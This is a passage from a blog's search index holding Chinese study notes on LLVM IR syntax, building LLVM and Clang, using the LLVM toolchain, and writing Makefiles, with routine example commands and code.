字节整数的 <code>main</code> 的简单定义类似于：<code>define i32 @main() &#123; ; some LLVM assembly code that returns i32 &#125;</code>。</li><li>函数声明：以 puts 函数为例，<code>declare i32 puts(i8*)</code>。该声明以关键字 <code>declare</code> 开始，后面紧跟着返回类型、函数名，以及该函数的可选参数列表。该声明必须是全局范围的。</li><li>每个函数均以返回语句结尾。有两种形式的返回语句：<code>ret &lt;type&gt; &lt;value&gt;</code> 或 <code>ret void</code>。对于简单的主例程，使用 <code>ret i32 0</code> 就足够了。</li><li>使用 <code>call &lt;function return type&gt; &lt;function name&gt; &lt;optional function arguments&gt;</code> 来调用函数。注意，每个函数参数都必须放在其类型的前面。返回一个 6 位的整数并接受一个 36 位的整数的函数测试的语法如下：<code>call i6 @test( i36 %arg1 )</code>。</li><li>如果函数入口块没有明确的标签，则会分配标签<code>％0</code>，那么该块中的第一个未命名的临时块将为<code>％1</code>，以此类推。</li></ul><h3 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h3><p>都写在注释里了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;hello.c&#39;   </span><br><span class="line">source_filename &#x3D; &quot;hello.c&quot;  ;指明源文件名</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;  </span><br><span class="line">;指明机器架构和数据布局</span><br><span class="line">target triple &#x3D; &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line">;定义字符串 hello world，unnamed_addr表明该地址不重要，并且可以合并两个相同的函数。</span><br><span class="line">@str &#x3D; private unnamed_addr constant [14 x i8] c&quot;Hello worl1d.\00&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">;定义函数，local_unnamed_addr表明该地址在模块内是不明显的</span><br><span class="line">define i32 @main() local_unnamed_addr #0 &#123;</span><br><span class="line">;调用puts函数</span><br><span class="line">  %1 &#x3D; tail call i32 @puts(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @str, i64 0, i64 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">;函数声明</span><br><span class="line">declare i32 @puts(i8* nocapture readonly) local_unnamed_addr #1</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; nounwind &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 6.0.0-1ubuntu2 (tags&#x2F;RELEASE_600&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html#artrelatedtopics">getelementptr</a>：</p><p><code>getelementptr</code> 的第一个参数是全局字符串变量的指针。要单步执行全局变量的指针，则需要使用第一个索引，即 <code>i64 0</code>。因为 <code>getelementptr</code> 指令的第一个参数必须始终是 <code>pointer</code> 类型的值，所以第一个索引会单步调试该指针。0 值表示从该指针起偏移 0 元素偏移量。我的开发计算机运行的是 64 位 Linux，所以该指针是 8 字节。第二个索引 (<code>i64 0</code>) 用于选择字符串的第 0 个元素，该元素是作为 <code>puts</code> 的参数来提供的。</p><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/langref/">https://llvm.zcopy.site/docs/langref/</a></p><p><a href="http://www.nagain.com/activity/article/7/">http://www.nagain.com/activity/article/7/</a></p><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html">https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm 环境搭建示例</title>
      <link href="posts/a75e0ae9/"/>
      <url>posts/a75e0ae9/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本机：<code>ubuntu 18.04</code></p><h3 id="直接安装"><a href="#直接安装" class="headerlink" title="直接安装"></a>直接安装</h3><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install llvm</span><br></pre></td></tr></table></figure><p>配置环境变量：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">If you need to have llvm first in your PATH run:</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/llvm/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find llvm you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/llvm/lib&quot;</span><br><span class="line">  export CPPFLAGS=&quot;-I/usr/local/opt/llvm/include&quot;</span><br></pre></td></tr></table></figure><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install llvm</span><br><span class="line">$ sudo apt install clang</span><br></pre></td></tr></table></figure><h3 id="llvm和clang混合编译"><a href="#llvm和clang混合编译" class="headerlink" title="llvm和clang混合编译"></a>llvm和clang混合编译</h3><p>要求：</p><table><thead><tr><th align="center">Package</th><th align="center">Version</th><th>Notes</th></tr></thead><tbody><tr><td align="center"><a href="http://gcc.gnu.org/">GCC</a></td><td align="center">&gt;=5.1.0</td><td>C/C++ compiler1</td></tr><tr><td align="center"><a href="http://www.python.org/">python</a></td><td align="center">&gt;=2.7</td><td>Automated test suite2</td></tr><tr><td align="center"><a href="http://zlib.net/">zlib</a></td><td align="center">&gt;=1.2.3.4</td><td>Compression library3</td></tr><tr><td align="center"><a href="http://savannah.gnu.org/projects/make">GNU Make</a></td><td align="center">3.79, 3.79.1</td><td>Makefile/build processor4</td></tr><tr><td align="center"><a href="http://cmake.org/">CMake</a></td><td align="center">&gt;=3.4.3</td><td>Makefile/workspace generator</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install cmake</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/llvm/llvm-project.git</span><br><span class="line">$ <span class="built_in">cd</span> llvm-project</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only -DLLVM_ENABLE_PROJECTS=clang ../llvm</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p><code>--enable-optimized</code>  打开优化，默认情况下是关闭的。这样会生成大量 debug 信息，需要较多的磁盘空间。</p><p><code>--enable-targets=host-only</code> 选择目标平台，默认情况下会生成所有平台的。 <code>host-only</code> 只选择本机即可。</p><blockquote><p>错误处理：</p><p>collect2: fatal error: ld terminated with signal 9 [Killed]</p><p>虚拟机内存不够，调大即可。</p><p>collect2: error: ld returned 1 exit status</p><p>个人情况是硬盘容量不足，拓展一下即可。</p></blockquote><h3 id="单独编译llvm"><a href="#单独编译llvm" class="headerlink" title="单独编译llvm"></a>单独编译llvm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载环境包：https://releases.llvm.org/download.html</span><br><span class="line">$ mkdir llvm </span><br><span class="line">$ <span class="built_in">cd</span> llvm</span><br><span class="line">$ tar xf llvm-7.0.1.src.tar.xz</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only  ../llvm-7.0.1.src</span><br><span class="line">$ cmake --build . <span class="comment">#编译</span></span><br></pre></td></tr></table></figure><p>第9行代码对应如下：</p><blockquote><p><code>cmake -G &lt;generator&gt; [options] ../llvm</code></p><p>Some common build system generators are:</p><ul><li><code>Ninja</code> 大多数llvm开发人员都使用Ninja。</li><li><code>Unix Makefiles</code> —用于生成与make兼容的并行makefile。</li><li><code>Visual Studio</code> —用于生成Visual Studio项目和解决方案。</li><li><code>Xcode</code>  用于生成Xcode项目</li></ul><p><a href="https://llvm.org/docs/GettingStarted.html">https://llvm.org/docs/GettingStarted.html</a></p><p>还有一些可选的 options：</p><ul><li><code>-DCMAKE_INSTALL_PREFIX=directory</code> 明确LLVM工具和库被安装的位置，默认在/usr/local下。</li><li><code>-DCMAKE_BUILD_TYPE=type</code> Debug选项，默认就是使用Debug，可以改为Release减少不必要的文件。</li><li><code>-DLLVM_ENABLE_ASSERTIONS=On</code> 编译时开启断言检查(assertion)，默认就是开启<br>  <strong>要注意整个llvm和build的绝对路径中不要出现中文，否则会出问题。</strong></li></ul></blockquote><h2 id="LLVM工具链的使用示例"><a href="#LLVM工具链的使用示例" class="headerlink" title="LLVM工具链的使用示例"></a>LLVM工具链的使用示例</h2><ol><li><p>Clang示例</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$ clang hello.c -o hello</span></span><br></pre></td></tr></table></figure><p> 此时得到一个可执行的 <code>hello</code>文件。c</p></li><li><p>将<code>hello.c</code>编译为LLVM字节码文件</p><p> <code>$ clang -O3 -emit-llvm hello.c -c -o hello.bc</code></p><p>  ps：<code>-emit-llvm</code>选项可与<code>-S</code>或<code>-c</code>选项一起使用，以分别为代码发出LLVM <code>.ll</code>或<code>.bc</code>文件。</p></li><li><p>使用两种方式运行程序:</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">$ lli hello.bc <span class="comment"># show llvm JIT</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>使用<code>llvm-dis</code>命令查看LLVM的汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis &lt; hello.bc | less</span><br></pre></td></tr></table></figure></li><li><p>使用<a href="https://llvm.zcopy.site/docs/man/llc.html">llc</a>将程序编译为本地汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc hello.bc -o hello.s</span><br></pre></td></tr></table></figure></li></ol><p>命令小结：</p><ul><li><code>llvm-as</code>：把LLVM IR从文本格式汇编成二进制格式。注意：此处得到的<strong>不是</strong>目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。</li><li><code>opt</code>：优化LLVM IR。输出新的LLVM IR。</li><li><code>llc</code>：把LLVM IR编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行LLVM IR。</li></ul><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/start.html">https://llvm.zcopy.site/docs/start.html</a></p><p><a href="http://clang.llvm.org/get_started.html">http://clang.llvm.org/get_started.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile 学习</title>
      <link href="posts/3a49d5b4/"/>
      <url>posts/3a49d5b4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是一个个人笔记，总结摘抄于：<a href="https://seisman.github.io/how-to-write-makefile/index.html"> 跟我一起写Makefile</a></p><h2 id="makefile简介"><a href="#makefile简介" class="headerlink" title="makefile简介"></a>makefile简介</h2><p><code>makefile</code>是一个包含一组指令的文件，<code>make build</code>自动化工具使用这些指令來生成目标。</p><p>优点：自动化编译，可以极大的提高了软件开发的效率。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites ...</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><strong>target</strong></p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。</p><p><strong>prerequisites</strong></p><p>生成该target所依赖的文件和<code>/</code>或target。反斜杠（ <code>\</code> ）是换行符的意思。</p><p><strong>command</strong></p><p>该target要执行的命令（任意的shell命令）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello:hello.c</span></span><br><span class="line">gcc -c hello.c</span><br><span class="line">gcc -o hello hello.o</span><br><span class="line">rm -f hello.o</span><br></pre></td></tr></table></figure><h3 id="工作流程浅析"><a href="#工作流程浅析" class="headerlink" title="工作流程浅析"></a>工作流程浅析</h3><ol><li>make会在当前目录下找<code>Makefile / makefile</code></li><li>找到后，会寻找第一个目标文件(target) <code>hello</code>，并作为最终的目标文件。</li><li>如果 <code>hello</code>不存在活或其依赖 <code>hello.c</code>的修改时间比 <code>hello</code>新，那么就会执行<code>command</code>来重新生成 <code>target</code></li></ol><p><strong>PS：一定要以一个 <code>Tab</code> 键作为开头</strong></p><p>make 会一层一层的寻找文件依赖关系，直至编译出第一个目标文件。如果在寻找的过程中出现错误，那么 make 就会退出并报错。</p><p>make 所着重的是寻找依赖关系，<code>command</code>的命令的正确与否是不关心的。</p><h2 id="makefile学习"><a href="#makefile学习" class="headerlink" title="makefile学习"></a>makefile学习</h2><h3 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h3><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>make支持三个通配符： <code>*</code> ， <code>?</code> 和 <code>~</code> </p><p><code>*</code>：匹配 0 或多个字符</p><p><code>?</code>：匹配任意一个字符</p><p><code>~</code>：Linux，<code>~</code> = <code>$HOME</code> Mac，则需要自己设置 <code>HOME</code>目录</p><h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPATH = src:../headers</span><br></pre></td></tr></table></figure><p>设置搜索路径，<code>make</code>执行时，如果当前目录找不到，则到指定路径取搜寻。</p><p>另一种则是：<code>vpath</code>关键字，注意<strong>全小写</strong>。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vpath &lt;pattern&gt; &lt;directories&gt; #为符合模式&lt;pattern&gt;的文件指定搜索目录&lt;directories&gt;。</span><br><span class="line">vpath &lt;pattern&gt; #清除符合模式&lt;pattern&gt;的文件的搜索目录。</span><br><span class="line">vpath    #清除所有已被设置好了的文件搜索目录。</span><br><span class="line">eg1:</span><br><span class="line">vpath %.h ../headers #现在当前目录搜索，若没找到则在“../headers”目录下搜索所有以 .h 结尾的文件。</span><br><span class="line">eg2:</span><br><span class="line">vpath %.c foo:bar   #make按照vpath语句的先后顺序来执行搜索</span><br><span class="line">vpath %   blish   #其表示 .c 结尾的文件，先在“foo”目录，然后是“blish”，最后是“bar”目录。</span><br></pre></td></tr></table></figure><h4 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h4><p>“伪目标”并不是一个文件，只是一个标签，由于“伪目标”不是文件，所以make无法生成它的依赖关系和决定它是否要执行。</p><p>PS：伪目标不能和文件重名。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean  <span class="comment">#使用“.PHONY”来显式地指明一个目标是“伪目标”</span></span><br></pre></td></tr></table></figure><p>例如清空规则：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm *.o temp</span><br></pre></td></tr></table></figure><h3 id="书写命令"><a href="#书写命令" class="headerlink" title="书写命令"></a>书写命令</h3><h4 id="显示命令"><a href="#显示命令" class="headerlink" title="显示命令"></a>显示命令</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@echo 正在编译XXX模块......</span><br></pre></td></tr></table></figure><p><code>@</code>是必须的，如果<code>make</code>执行时，带入<code>make</code>参数 <code>-n</code> 或 <code>--just-print</code> ，那么其只是显示命令，但不会执行命令。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5</span><br><span class="line">    pwd   <span class="comment">#打印当前目录</span></span><br><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5;pwd <span class="comment">#打印/home/focu5下的目录</span></span><br></pre></td></tr></table></figure><h4 id="命令出错"><a href="#命令出错" class="headerlink" title="命令出错"></a>命令出错</h4><p>有些命令执行结果的正确与否我们是不关心的，那么有两种办法可以解决：</p><ol><li>在命令前加 <code>-</code></li><li>执行 <code>make</code>的时候，加上 <code>-i / --ignore-errors</code>参数（这种做法会忽略掉所有命令的错误</li></ol><p>另外：参数的是 <code>-k</code> 或是 <code>--keep-going</code> ，指如果某规则中的命令出错了，那么就终止该规则的执行，但继续执行其它规则。</p><h4 id="定义命令包"><a href="#定义命令包" class="headerlink" title="定义命令包"></a>定义命令包</h4><p>定义这种命令序列的语法以 <code>define</code> 开始，以 <code>endef</code> 结束，骨架如下:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> 包名</span><br><span class="line">...</span><br><span class="line">command</span><br><span class="line">...</span><br><span class="line"><span class="keyword">endef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 $(包名) 来调用包</span></span><br></pre></td></tr></table></figure><p>包名不能和变量名重名。</p><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = hello.c</span><br><span class="line">tag = hello</span><br><span class="line"><span class="section">hello: <span class="variable">$(objects)</span></span></span><br><span class="line">gcc -o hello <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line"><span class="section">.PHONA: clean</span></span><br><span class="line"><span class="section">.PHONA: clean1</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o *.out</span><br><span class="line"></span><br><span class="line"><span class="section">clean1:</span></span><br><span class="line">rm -f <span class="variable">$(tag)</span></span><br></pre></td></tr></table></figure><p>变量命名可以包含：数字、字符、下划线（可以是数字开头），但不能含有 <code>:</code> 、 <code>#</code> 、 <code>=</code> 或是空字符（空格、回车等）。<strong>变量名对大小写是敏感的</strong>。</p><p>变量在声明的时候要进行初始化，使用时最好用 <code>()或&#123;&#125;</code>将变量包裹起来，eg：<code>$(obj)   $&#123;obj&#125; </code> 另外<code>$$</code>则表示使用<code>$</code></p><p>变量会在使用它的时候精确展开。</p><h4 id="变量高级用法"><a href="#变量高级用法" class="headerlink" title="变量高级用法"></a>变量高级用法</h4><p><strong>变量值替换</strong></p><p>格式: <code>$(var:a=b)</code> 或是 <code>$&#123;var:a=b&#125;</code> 把 <code>a</code>均替换成 <code>b</code></p><p><strong>变量嵌套</strong></p><p>也就是用变量的值去做新的变量。个人觉得追加更简单一些。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">a := $(<span class="variable">$(x)</span>)  <span class="comment">#a = $(y), $(a) = z</span></span><br><span class="line">a := <span class="variable">$(x)</span> <span class="variable">$(y)</span> <span class="comment"># $(a) = y z</span></span><br><span class="line"></span><br><span class="line">y += <span class="variable">$(x)</span>  <span class="comment">#$(y) = z y</span></span><br></pre></td></tr></table></figure><h3 id="隐含规则"><a href="#隐含规则" class="headerlink" title="隐含规则"></a>隐含规则</h3><p>示例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①</span></span><br><span class="line">foo : foo.o bar.o</span><br><span class="line">    cc –o foo foo.o bar.o <span class="variable">$(CFLAGS)</span> <span class="variable">$(LDFLAGS)</span></span><br><span class="line"><span class="comment">#②</span></span><br><span class="line">foo.o : foo.c</span><br><span class="line">    cc –c foo.c <span class="variable">$(CFLAGS)</span></span><br><span class="line">bar.o : bar.c</span><br><span class="line">    cc –c bar.c <span class="variable">$(CFLAGS)</span></span><br></pre></td></tr></table></figure><p><code>makefile</code>会有自动推导的过程，所以我们写成①的形式会更简洁一些。</p><p>部分隐含规则：</p><ul><li><p><code>CC</code> : C语言编译程序。默认命令是 <code>cc</code>   </p></li><li><p><code>CXX</code> : C++语言编译程序。默认命令是 <code>g++</code></p></li><li><p><code>RM</code> : 删除文件命令。默认命令是 <code>rm –f</code></p></li><li><p><code>CFLAGS</code> : C语言编译器参数。</p></li><li><p><code>CXXFLAGS</code> : C++语言编译器参数。</p></li><li><p><code>LDFLAGS</code> : 链接器参数。（如： <code>ld</code> ）</p></li><li><p>使用的时候请用：$(CC) 、$(RM) 等</p><p>  <a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html">更详细参考这里</a></p></li></ul><p>示例：</p><p>把所有的 <code>.c</code> 文件都编译成 <code>.o</code> 文件.</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c</span><br><span class="line">    <span class="variable">$(CC)</span> -c <span class="variable">$(CFLAGS)</span> <span class="variable">$(CPPFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>其中， <code>$@</code> 表示所有的目标的挨个值， <code>$&lt;</code> 表示了所有依赖目标的挨个值。</p><h3 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h3><ul><li><code>$@</code> : 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么， <code>$@</code> 就是匹配于目标中模式定义的集合。</li><li><code>$%</code> : 仅当目标是函数库文件中，表示规则中的目标成员名。</li><li><code>$&lt;</code> : 依赖目标中的第一个目标名字。如果依赖目标是以模式（即 <code>%</code> ）定义的，那么 <code>$&lt;</code> 将是符合模式的一系列的文件集。注意，其是一个一个取出来的。</li><li><code>$?</code> : 所有比目标新的依赖目标的集合。以空格分隔。</li><li><code>$^</code> : 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那么这个变量会去除重复的依赖目标，只保留一份。</li><li><code>$+</code> : 这个变量很像 <code>$^</code> ，也是所有依赖目标的集合。只是它不去除重复的依赖目标。</li></ul><h3 id="Makefile中一些GNU约定俗成的伪目标"><a href="#Makefile中一些GNU约定俗成的伪目标" class="headerlink" title="Makefile中一些GNU约定俗成的伪目标"></a>Makefile中一些GNU约定俗成的伪目标</h3><table><thead><tr><th align="left">伪目标</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">all</td><td align="left">所有目标的目标，其功能一般是编译所有的目标</td></tr><tr><td align="left">clean</td><td align="left">删除所有被make创建的文件</td></tr><tr><td align="left">install</td><td align="left">安装已编译好的程序，其实就是把目标可执行文件拷贝到指定的目录中去</td></tr><tr><td align="left">print</td><td align="left">列出改变过的源文件</td></tr><tr><td align="left">tar</td><td align="left">把源程序打包备份. 也就是一个tar文件</td></tr><tr><td align="left">dist</td><td align="left">创建一个压缩文件, 一般是把tar文件压成Z文件. 或是gz文件</td></tr><tr><td align="left">TAGS</td><td align="left">更新所有的目标, 以备完整地重编译使用</td></tr><tr><td align="left">check 或 test</td><td align="left">一般用来测试makefile的流程</td></tr></tbody></table><p>参考：</p><p><a href="https://seisman.github.io/how-to-write-makefile/index.html"> 跟我一起写Makefile</a></p><p><a href="https://cloud.tencent.com/developer/article/1343894">https://cloud.tencent.com/developer/article/1343894</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> makefile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
